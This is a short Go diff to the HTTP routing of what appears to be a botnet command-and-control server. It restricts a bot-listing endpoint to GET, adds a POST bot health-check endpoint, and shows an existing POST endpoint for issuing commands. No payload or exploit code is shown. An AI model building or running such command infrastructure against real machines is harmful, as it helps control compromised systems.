@@ -23,7 +23,10 @@ func NewHandler(cc botnet.Commander, storage botnet.Storager) *Handler {
 	}
 
 	const listBotsPath = "/bots"
-	h.Handle(listBotsPath, h.handleListBots())
+	h.Handle(listBotsPath, h.handleListBots()).Methods("GET")
+
+	const checkBotsHealthPath = "/bots/health"
+	h.Handle(checkBotsHealthPath, h.handleCheckBotsHealth()).Methods("POST")
 
 	const commandPath = "/commands"
 	h.Handle(commandPath, h.handleCommand()).Methods("POST")
